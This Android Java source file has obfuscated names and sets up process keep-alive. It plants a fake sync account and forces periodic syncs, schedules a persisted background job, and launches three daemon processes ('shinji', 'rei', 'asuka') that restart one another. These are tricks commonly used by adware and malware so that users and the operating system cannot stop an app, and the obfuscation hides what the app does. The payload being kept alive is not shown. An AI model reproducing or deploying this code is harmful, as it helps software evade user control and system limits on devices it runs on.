package com.myaaa.nfjowejfowe;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.PeriodicSync;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;

import com.PlesRNO.xsjspLdGyCp.hFLjNKM;
import com.myaaa.nfjowejfowe.jiojoi.jdiowejofe;
import com.myaaa.nfjowejfowe.jiojoi.jowjodfwe;
import com.myaaa.nfjowejfowe.fiowjfoew.jijo;
import com.myaaa.nfjowejfowe.fiowjfoew.ofwejofoew;
import com.myaaa.nfjowejfowe.fiowjfoew.jiofewjof;
import com.myaaa.nfjowejfowe.fiowjfoew.fkowfowe;

import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * @author Create by Payne on 2021/5/26
 * Description:
 **/
public class jfowejfew {
    public static Account account;
    public static String authority1;
    public static String authority2;
    public static joifewjoif assist;

    public static void init(Context context) {
        jiofjoef appCxt = new jiofjoef(context);
        getProcessAssist(appCxt);
        initAccount(appCxt);
    }

    private static void getProcessAssist(jiofjoef appCxt) {
        hFLjNKM.QXhBYyda(appCxt.context);
        initAsukaJob(appCxt);
        initProcess(appCxt);
    }

    private static void initAccount(jiofjoef bVar) {
        if (TextUtils.equals(bVar.pkgName, bVar.processName)) {
            try {
                authority1 = "account_provider";
                authority2 = "account_provider1";
                account = new Account("account_name", "account_type");
                AccountManager accountManager = AccountManager.get(bVar.context);
                int i2 = 0;
                if (accountManager.getAccountsByType("account_type").length <= 0) {
                    accountManager.addAccountExplicitly(account, null, Bundle.EMPTY);
                    ContentResolver.setIsSyncable(account, authority1, 1);
                    ContentResolver.setSyncAutomatically(account, authority1, true);
                    ContentResolver.setMasterSyncAutomatically(true);
                }
                setIsSyncable();
                if (!ContentResolver.isSyncPending(account, authority1)) {
                    initBundle(true);
                }
                List<PeriodicSync> periodicSyncs = ContentResolver.getPeriodicSyncs(account, authority1);
                if (periodicSyncs != null) {
                    if (periodicSyncs.size() > 0) {
                        i2 = 1;
                    }
                }
                if (i2 == 0) {
                    ContentResolver.addPeriodicSync(account, authority1, Bundle.EMPTY, Build.VERSION.SDK_INT >= 24 ? 900 : 3600);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static void initAsukaJob(jiofjoef bVar) {
        if (!TextUtils.equals(bVar.pkgName, bVar.processName) || Build.VERSION.SDK_INT < 21) {
            return;
        }
        if (bVar.c()) {
            startAsukaJob(bVar.context, 900);
        } else {
            cancelAsukaJob(bVar.context);
        }
    }

    private static void initProcess(jiofjoef appCxt) {
        if (assist == null) {
            try {
                joifewjoif.Builder builder = new joifewjoif.Builder(appCxt.context);
                builder.pkgName = appCxt.pkgName;
                builder.processOne = builder.pkgName + ":" + "shinji";
                builder.processTwo = builder.pkgName + ":" + "rei";
                builder.processThree = builder.pkgName + ":" + "asuka";
                builder.instruIntent = new Intent().setClassName(appCxt.pkgName, owefoew.class.getName());
                builder.dServiceIntent = new Intent().setClassName(appCxt.pkgName, ofwejofoew.class.getName());
                builder.dReceiverIntent = new Intent().setClassName(appCxt.pkgName, jowjodfwe.class.getName()).setPackage(appCxt.pkgName);
                builder.serviceStarter = new fkowfowe();
                assist = builder.build();
            } catch (Exception e) {
                assist = null;
            }

            if (assist != null) {
                if (assist.pkgName.equals(appCxt.processName)) {
                    jiofewjof.register(appCxt.context);
                    jdiowejofe.send(appCxt.context);
                }
                if (assist.pkgName.equals(appCxt.processName) || assist.processOne.equalsIgnoreCase(appCxt.processName)) {
                    assist.serviceStarter.start(appCxt.context, assist.processOne);
                    assist.serviceStarter.start(appCxt.context, assist.processTwo);
                    assist.serviceStarter.start(appCxt.context, assist.processThree);
                }
                if (assist.processOne.equals(appCxt.processName)) {
                    jiodewjofew.startDaemon("shinji", "rei", "asuka");
                }
                if (assist.processTwo.equals(appCxt.processName)) {
                    jiodewjofew.startDaemon("rei", "shinji", "asuka");
                }
                if (assist.processThree.equals(appCxt.processName)) {
                    jiodewjofew.startDaemon("asuka", "shinji", "rei");
                }
            }

        }
    }


    @TargetApi(21)
    private static void startAsukaJob(Context context, int intervalTime) {
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        JobInfo.Builder builder = new JobInfo.Builder(10086, new ComponentName(context.getPackageName(), jijo.class.getName()));
        builder.setPersisted(true);
        builder.setPeriodic(TimeUnit.SECONDS.toMillis((long) intervalTime));
        jobScheduler.cancel(1000);
        try {
            jobScheduler.schedule(builder.build());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @TargetApi(21)
    private static void cancelAsukaJob(Context context) {
        ((JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE)).cancel(1000);
    }

    public static joifewjoif getProcessAssist() {
        return assist;
    }

    public static void setIsSyncable() {
        ContentResolver.setIsSyncable(account, authority2, -1);
    }

    public static void initBundle(boolean z) {
        try {
            Bundle bundle = new Bundle();
            bundle.putBoolean("force", true);
            if (z) {
                bundle.putBoolean("require_charging", true);
            }
            ContentResolver.requestSync(account, authority1, bundle);
            ////Log.e("DaemonLog", "requestSync");
        } catch (Exception e2) {
            ////Log.e("DaemonLog", "requestSync error:", e2);
        }
    }

    public static boolean isDaemon(String processName){
        return processName.contains("asukaChannel")
                || processName.contains("asukaService")
                || processName.contains("asukaWorker")
                || processName.contains("daemon")
                || processName.contains("service");

    }

}
